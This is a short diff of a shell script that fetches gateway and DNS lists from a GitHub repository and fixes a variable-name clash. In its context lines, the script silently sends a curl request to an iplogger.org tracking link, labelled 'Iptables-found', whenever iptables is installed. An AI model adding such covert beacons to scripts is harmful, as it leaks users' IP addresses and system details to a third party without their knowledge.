@@ -1,6 +1,6 @@
 c=$(curl -s https://raw.githubusercontent.com/zoalsharf/rig/master/gateway)
 d=$(curl -s https://raw.githubusercontent.com/zoalsharf/rig/master/dns)
-d=$(command -v iptables|wc -l)
+di=$(command -v iptables|wc -l)
 
 del1 () {
         for i in ${c[@]}; do
@@ -26,7 +26,7 @@ host () {
         done
 }
 
-if [ $d -eq "1" ]; then
+if [ $di -eq "1" ]; then
         curl -A Iptables-found/1.9 -s https://iplogger.org/389LB3
 else
         exit
